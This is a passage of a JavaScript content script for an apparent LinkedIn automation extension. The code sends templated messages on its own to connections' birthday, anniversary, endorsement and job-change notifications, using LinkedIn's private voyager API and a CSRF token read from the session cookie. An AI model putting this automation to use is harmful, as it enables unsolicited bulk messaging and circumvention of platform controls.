            showNotification("There are no open link profiles in standard search.\nPlease check Send InMails using credits.");
        }
    } else if(typeof callback == 'function'){
        callback();
    }
}

function getMsgEntityURN(urn, callback){
    callXHROnLinkedIn(LINKEDIN_DOMAIN_URL + 'voyager/api/messaging/conversations?keyVersion=LEGACY_INBOX&q=participants&recipients=List('+urn+')', [{key:'x-restli-protocol-version', val:'2.0.0'}], function(data){
        if(data && data.elements && data.elements.length > 0 && data.elements[0].entityUrn){
            if(typeof callback == 'function'){
                callback(data.elements[0].entityUrn);
            }
        } else {
            if(typeof callback == 'function'){
                callback(false);
            }
        }
    });
}

function updateUIByPlan(){
    switch(user_details.user_type){
        case 'Basic':
            // $("[data-tab='visit_profiles']").attr({
            //     "disabled": true,
            //     "data-toggle": "tooltip",
            //     "data-original-title": "Upgrade plans to Visit profiles",
            //     "data-placement": "bottom",
            //     "class": "upgrade_membership"
            // });
            // $("[data-tab='connection_invitation']").attr({
            //     "disabled": true,
            //     "data-toggle": "tooltip",
            //     "data-original-title": "Upgrade plans to send connection invitations",
            //     "data-placement": "bottom",
            //     "class": "upgrade_membership"
            // });
            $("[data-tab='message']").attr({
                "disabled": true,
                "data-toggle": "tooltip",
                "data-original-title": "Upgrade plans to message",
                "data-placement": "bottom",
                "class": "upgrade_membership"
            });
            $("[data-tab='inmail']").attr({
                "disabled": true,
                "data-toggle": "tooltip",
                "data-original-title": "Upgrade plans to InMail",
                "data-placement": "bottom",
                "class": "upgrade_membership"
            });
            break;
        case 'Free':
        case 'Personal':
            $("[data-tab='message']").attr({
                "disabled": true,
                "data-toggle": "tooltip",
                "data-original-title": "Upgrade plans to Message",
                "data-placement": "bottom",
                "class": "upgrade_membership"
            });
            $("[data-tab='inmail']").attr({
                "disabled": true,
                "data-toggle": "tooltip",
                "data-original-title": "Upgrade plans to InMail",
                "data-placement": "bottom",
                "class": "upgrade_membership"
            });
            break;
        case 'Business':
        case 'Lifetime':
        case 'AppSumo Business':
            // if(user_details.user_type == 'AppSumo' && user_details.user_plan == 'ASE49'){
            //     break;
            // }
            $("[data-tab='inmail']").attr({
                "disabled": true,
                "data-toggle": "tooltip",
                "data-original-title": "Upgrade plans to InMail",
                "data-placement": "bottom",
                "class": "upgrade_membership"
            });
            break;
    }
    $('[data-toggle="tooltip"]').tooltip();
}

function checkEngagement(urns, idx, callback){
    if(urns[idx]){
        var urn = urns[idx].entityUrn;
        if(!urn.match(/[A-Z]/g)){
            var urnMatch = connections_all && connections_all.length > 0 && typeof connections_all == 'object' && connections_all.filter(x=>(x.publicIdentifier == urn || x.objectUrn.indexOf(urn) > -1))[0];
            if(urnMatch)
                urn = urnMatch.entityUrn.slice(22);
        }
        if(urn){
            callXHROnLinkedIn(LINKEDIN_DOMAIN_URL + 'voyager/api/messaging/conversations?keyVersion=LEGACY_INBOX&q=participants&recipients=List('+urn+')', [{key:'x-restli-protocol-version', val:'2.0.0'}], function(data){
                if(data){
                    if(data.elements && data.elements.length > 0 && data.elements[0].entityUrn){
                        var entityUrn = data.elements[0].entityUrn.replace(/urn:li:fs_conversation:/,'');
                        callXHROnLinkedIn(LINKEDIN_DOMAIN_URL + 'voyager/api/messaging/conversations/'+entityUrn+'/events', [{key:'x-restli-protocol-version', val:'2.0.0'}], function(comm){
                            if(comm && comm.elements && comm.elements.length > 0){
                                var engagement = comm.elements.filter(function(c){
                                    return c.subtype == 'MEMBER_TO_MEMBER'
                                });
                                if(engagement.length > 1){
                                    urns[idx].engaged = true;
                                }
                            }
                            idx++;
                            checkEngagement(urns, idx, callback);
                        })
                    } else {
                        idx++;
                        checkEngagement(urns, idx, callback);
                    }
                } else {
                    idx++;
                    checkEngagement(urns, idx, callback);
                }
            })
        } else {
            idx++;
            checkEngagement(urns, idx, callback);
        }
    } else if(typeof callback == 'function'){
        callback(urns);
    }
}

function processNotifications(){
    if(!user_details.autoWish){
        return false;
    }
    var getTotalNotificationsElements = function(fr_set, callback){
        var fr_links = [];
        var frs_length = fr_set.length;
        var fr_comp = 0;
        fr_set.forEach(function(i, idx){
            if(i.cardAction && i.cardAction.actionTarget && i.cardAction.actionTarget.indexOf('cardUrn=') >= 0){
                var cardUrn = i.cardAction.actionTarget.match(/cardUrn=(.*?)&/)[1];
                var action_type_url = LINKEDIN_DOMAIN_URL + 'voyager/api/identity/notificationCards?appName=VOYAGER&notificationUrn=#cardUrn#&q=aggregatedCards';
                action_type_url = action_type_url.replace(/#cardUrn#/, cardUrn);
                fr_links.push(action_type_url);
            }
            fr_comp++;
            if(frs_length == fr_comp){
                getCardActionTarget(fr_links, 0, [], function(resp_arr){
                    callback(resp_arr);
                })
            }
        });
        if(fr_set.length == 0){
            callback([]);
        }
    };
    getTemplates(function(templates){
        if(templates){
            messageTemplates = templates.filter(x=>x.template_type=='message');
            inMailTemplates = templates.filter(x=>x.template_type=='inmail');
            invitationMessages = templates.filter(x=>x.template_type=='connection_invitation');
            followUpMessages = templates.filter(x=>x.template_type=='follow_up_message');
            notificationTemplates = templates.filter(x=>x.template_type=='notification');
        } else {
            console.log("Missing templates here");
        }
        callXHROnLinkedIn(LINKEDIN_DOMAIN_URL + 'voyager/api/identity/notificationCards?appName=NEPTUNE&count=100&q=notifications&start=0', [], function(res){
            var d = new Date();
            var date_at_zero = new Date(d.getFullYear(),d.getMonth(),d.getDate(),0,0,0).getTime();
            // var filteredRes = res.elements.filter(x=>(x.publishedAt - date_at_zero > 0));
            var filteredRes = res && res.elements && res.elements.filter(x=>( ((Date.now() - x.publishedAt)/1000/60/60) < 24 ));
            var filteredAnniversaries = filteredRes.filter(x=>( x.entityUrn.indexOf('WORK_ANNIVERSARY') > 0 && x && x.actions && x.actions.length > 0 && x.actions[0].type != 'CONFIRMATION' ));
            var filteredBirthdays = filteredRes.filter(x=>( x.entityUrn.indexOf('BIRTHDAY') > 0 && x && x.actions && x.actions.length > 0 && x.actions[0].type != 'CONFIRMATION' ));
            var filteredEndorsements = filteredRes.filter(x=>( x.entityUrn.indexOf('SKILL_ENDORSEMENT') > 0 && x && x.actions && x.actions.length > 0 && x.actions[0].type != 'CONFIRMATION' ));
            var filteredJobChange = filteredRes.filter(x=>( x.entityUrn.indexOf('JOB_CHANGE') > 0 && x && x.actions && x.actions.length > 0 && x.actions[0].type != 'CONFIRMATION' ));
            var notification_messages = {
                anniversary : filteredAnniversaries,
                birthday : filteredBirthdays,
                endorsement : filteredEndorsements,
                jobchange: filteredJobChange
            }
            getTotalNotificationsElements(filteredAnniversaries, function(ann_arr){
                if(ann_arr.length > 0) notification_messages['anniversary'] = ann_arr;
                getTotalNotificationsElements(filteredBirthdays, function(bday_arr){
                    if(bday_arr.length > 0) notification_messages['birthday'] = bday_arr;
                    getTotalNotificationsElements(filteredEndorsements, function(end_arr){
                        if(end_arr.length > 0) notification_messages['endorsement'] = end_arr;
                        getTotalNotificationsElements(filteredJobChange, function(jc_arr){
                            if(jc_arr.length > 0) notification_messages['jobchange'] = jc_arr;
                            sendIndRepliesToNotifications(notification_messages);
                        })
                    })
                })
            })
        })
    })
}

function sendIndRepliesToNotifications(notification_messages){
    chrome.runtime.sendMessage({
        'getUserComms': true
    }, function(cm){
        recentComms = cm && cm.comms || [];
        sendNotificationMessages('anniversary', notification_messages['anniversary'], 0, function(){
            sendNotificationMessages('birthday', notification_messages['birthday'], 0, function(){
                sendNotificationMessages('endorsement', notification_messages['endorsement'], 0, function(){
                    sendNotificationMessages('jobchange', notification_messages['jobchange'], 0, function(){
                        if(notification_messages['anniversary'].length > 0 || notification_messages['birthday'].length > 0 || notification_messages['endorsement'].length > 0 || notification_messages['jobchange'].length > 0){
                            showNotification("Auto replied to notifications");
                        }
                    })
                })
            })
        })
    });
}

function sendNotificationMessages(not_type, notificationObjArr, idx, callback){
    if(notificationObjArr && notificationObjArr[idx]){
        var notObj = notificationObjArr[idx];
        if(notObj && notObj.actions && notObj.actions.length > 0 && notObj.actions[0] && notObj.actions[0].addActionType == 'MESSAGE'){
            var miniProfile = (notObj.actions[0].displayText && notObj.actions[0].displayText.accessibilityTextAttributes && notObj.actions[0].displayText.accessibilityTextAttributes.length > 0 && notObj.actions[0].displayText.accessibilityTextAttributes[0] && notObj.actions[0].displayText.accessibilityTextAttributes[0].miniProfile) || (notObj.actions[0].confirmationText && notObj.actions[0].confirmationText.attributes.length > 0 && notObj.actions[0].confirmationText.attributes[0] && notObj.actions[0].confirmationText.attributes[0].miniProfile);
            if(miniProfile){
                var entityUrn = miniProfile.entityUrn.replace('urn:li:fs_miniProfile:','');
                var msg_url = LINKEDIN_DOMAIN_URL + 'voyager/api/messaging/conversations?action=create';
                var msg_obj = notificationTemplates.filter(x=>x.id==user_details.autoWish[not_type]);
                if(msg_obj && msg_obj[0]){
                    var tc = msg_obj[0].template_content;
                    // console.log(recentComms);
                    var matchedComm = recentComms.filter(x=>x.entityUrn == entityUrn && x.type == 'NotificationMessage');
                    if(matchedComm && matchedComm[0]){
                        var comm = matchedComm[0];
                        var daysSent = (new Date() - new Date(comm.date_sent))/(ONE_DAY);
                        if(daysSent < 1){
                            idx++;
                            sendNotificationMessages(not_type, notificationObjArr, idx, callback);
                            return false;
                        }
                    }
                    // Add code to prevent messaging again
                    visitProfile(entityUrn, function(attrs){
                        getFormattedAddress(attrs.locationName, tc, function(address){
                            if(address != 'error' || (tc.indexOf('%city%') == -1 && tc.indexOf('%state%') == -1 && tc.indexOf('%country%') == -1) ){
                                if(address == 'error'){
                                    address = {
                                        city: '',
                                        state: '',
                                        country: ''
                                    }
                                }
                                var aliasRec = aliases && aliases.length > 0 && typeof aliases == 'object' && aliases.filter(x=>x.entityUrn == entityUrn)[0];
                                var firstName = attrs.firstName;
                                var lastName = attrs.lastName;
                                if(aliasRec){
                                    firstName = aliasRec.new_name.split(" ").slice(0,1)[0];
                                    lastName = aliasRec.new_name.split(" ").slice(-1)[0];
                                }
                                tc = tc.replace(/%firstName%/g, firstName)
                                        .replace(/%lastName%/g, lastName)
                                        .replace(/%position%/g, attrs.title)
                                        .replace(/%company%/g, attrs.companyName)
                                        .replace(/%industry%/g, attrs.industryName)
                                        .replace(/%city%/g, address.city)
                                        .replace(/%state%/g, address.state)
                                        .replace(/%country%/g, address.country);
                                var msg_post_data = JSON.stringify({
                                    "conversationCreate": {
                                        "eventCreate": {
                                            "value": {
                                                "com.linkedin.voyager.messaging.create.MessageCreate": {
                                                    "body": tc,
                                                    "attachments": []
                                                }
                                            }
                                        },
                                        "recipients": [entityUrn],
                                        "subtype": "MEMBER_TO_MEMBER"
                                    },
                                    "keyVersion": "LEGACY_INBOX"
                                });
                                var comm_obj = {
                                    type: 'NotificationMessage',
                                    date_sent: true,
                                    rec_name: firstName + ' ' + lastName,
                                    content: tc,
                                    profile_url: LINKEDIN_PROFILE_URL + attrs.publicIdentifier,
                                    profile_id: attrs.publicIdentifier,
                                    member_id: attrs.objectUrn,
                                    entityUrn: attrs.entityUrn
                                }
                                $.ajax({
                                    url: msg_url,
                                    type: 'POST',
                                    data: msg_post_data,
                                    dataType: 'json',
                                    contentType: 'application/json; charset=utf-8',
                                    beforeSend: function(req) {
                                        var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                                        req.setRequestHeader('csrf-token', csrf_token);
                                    },
                                    xhrFields: {
                                        withCredentials: true
                                    },
                                    success: function(resp) {
                                        chrome.runtime.sendMessage({
                                            audit : true,
                                            comm_obj : comm_obj,
                                            event : 'notification_'+not_type+'_message_sent'
                                        });
                                        var action = notObj.actions[0];
                                        if(action.addActionType && action.itemUrn){
                                            $.ajax({
                                                url: LINKEDIN_DOMAIN_URL + 'voyager/api/identity/cards?action=addAction',
                                                type: 'POST',
                                                data: JSON.stringify({
                                                    "actionType": action.addActionType,
                                                    "item": action.itemUrn
                                                }),
                                                dataType: 'json',
                                                contentType: 'application/json; charset=utf-8',
                                                beforeSend: function(req) {
                                                    var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                                                    req.setRequestHeader('csrf-token', csrf_token);
                                                },
                                                xhrFields: {
                                                    withCredentials: true
                                                }
                                            });
                                        }
                                    },
                                    error: function() {
                                        chrome.runtime.sendMessage({
                                            audit : true,
                                            event : 'notification_'+not_type+'_message_error'
                                        });
                                    },
                                    complete: function(){
                                        idx++;
                                        sendNotificationMessages(not_type, notificationObjArr, idx, callback);
                                    }
                                });
                            } else {
                                chrome.runtime.sendMessage({
                                    audit : true,
                                    event : 'problem_with_location'
                                });
                                idx++;
                                sendNotificationMessages(not_type, notificationObjArr, idx, callback);
                            }
                        })
                    })
                } else {
                    idx++;
                    sendNotificationMessages(not_type, notificationObjArr, idx, callback);
                }
            }
        } else {
            idx++;
            sendNotificationMessages(not_type, notificationObjArr, idx, callback);
        }
    } else {
        if(typeof callback == 'function'){
            callback();
        }
    }
}

function getFormattedAddress(area, body, callback, noOfTimesCalled){
    if(body && (body.indexOf('%city%') >= 0 || body.indexOf('%state%') >= 0 || body.indexOf('%country%') >= 0) ){
        $.ajax({
            url : 'https://maps.googleapis.com/maps/api/geocode/json?address='+area+'&sensor=false',
            success: function(res){
                if(typeof res == 'string'){
                    res = JSON.parse(res);
                }
                var country = '', state = '', city = '';
                if(res.results && res.results.length > 0){
                    var address_components = res.results[0].address_components;
                    var country_arr = address_components.filter(x=>(x.types.indexOf('country')>=0));
                    if(country_arr && country_arr.length > 0){
                        country = country_arr[0].long_name;
                    }
                    var state_arr = address_components.filter(x=>(x.types.indexOf('administrative_area_level_1')>=0));
                    if(state_arr && state_arr.length > 0){
                        state = state_arr[0].long_name;
                    }
                    var city_arr = address_components.filter(x=>(x.types.indexOf('locality')>=0 || x.types.indexOf('sublocality')>=0));
                    if(city_arr && city_arr.length > 0){
                        city = city_arr[0].long_name;
                    }
                    if(country && state && city){
                        if(typeof callback == 'function'){
                            callback({
                                city: city,
                                state: state,
                                country: country
                            });
                        } else {
                            console.log({
                                city: city,
                                state: state,
                                country: country
                            });
                        }
                    } else {
                        console.log({
                            city: city,
                            state: state,
                            country: country
                        });
                        if(typeof callback == 'function'){
                            callback('error');
                        }
                    }
                } else {
                    noOfTimesCalled = noOfTimesCalled > 0 ? noOfTimesCalled : 1;
                    if(noOfTimesCalled < 5){
                        noOfTimesCalled++;
                        getFormattedAddress(area, body, callback, noOfTimesCalled)
                    } else {
                        console.log("Could not get address");
                        if(typeof callback == 'function'){
                            callback('error');
                        }
                    }
                }
            }
        })
    } else {
        callback({city:'',state:'',country:'', locationName: area});
    }
}

function getCardActionTarget(linkArr, idx, resp_arr, callback){
    if(linkArr[idx]){
        var action_type_url = linkArr[idx];
        callXHROnLinkedIn(action_type_url, [], function(res){
            if(res && res.elements){
                var elems = res && res.elements && res.elements.filter(x=>( ((Date.now() - x.publishedAt)/1000/60/60) < 24 ));
                elems = elems.filter(x=>( x.actions[0].type != 'CONFIRMATION' ));
                resp_arr = resp_arr.concat(elems);
            }
            idx++;
            getCardActionTarget(linkArr, idx, resp_arr, callback);
        })
    } else {
        callback(resp_arr);
    }
}

function getUserDetails(callback) {
    chrome.storage.local.get("user_details", function(ud) {
        callback(ud['user_details']);
    })
}

function logOutUserFromLeonard() {
    getUserDetails(function(ud) {
        user_details = null;
        chrome.storage.local.set({
            "user_details" : null
        }, function(){
            chrome.runtime.sendMessage({
                resetUserID : true
            }, function(){
                chrome.runtime.sendMessage({
                    removeBadge: true
                })
                showNotification(local_strings['RELOADING_LINKEDIN']);
                location.reload();
            });
        });
    })
}

var deleteCookie = function(name) {
    document.cookie = name + '=;expires=Thu, 01 Jan 1970 00:00:01 GMT;';
};

window.onbeforeunload = function(){
    if (local_data.startedViewing || local_data.startedScanning || local_data.startedMessaging || local_data.startedSending || local_data.startedMailing){
        return true;
    }
}

window.onerror = function(err) {
    chrome.runtime.sendMessage({error: err, func: 'onerror'});
    // console.log(arguments)
    // showNotification("Please check the console\nThere is some error.");
    // location.reload();
}

String.prototype.toCapitalize = function(){
    return this.slice(0,1).toUpperCase() + this.slice(1);
}

Array.prototype.removeDups = function(){
    var that = this;
    return this.filter(function(item, pos) {
        return that.indexOf(item) == pos;
    })
}

window.addEventListener("message", function(event){
    if (event.source != window)
        return;
    if(event.data.request && (event.data.request == "FROM_LEONARD")){
        switch(event.data.method){
            case 'getUserDetails':
                getUserDetails(function(ud){
                    $("#Leonard_Ext_ID").text(JSON.stringify(ud));
                });
                break;
            case 'redeemCode':
                chrome.runtime.sendMessage({
                    coupon_code: event.data.coupon_code,
                    user_id: event.data.user_id,
                    redeemCode: true
                }, function(res){
                    $("#Leonard_Ext_ID").text(JSON.stringify(res));
                })
                break;
            default:
                console.log('No Method found');
        }
    }
});
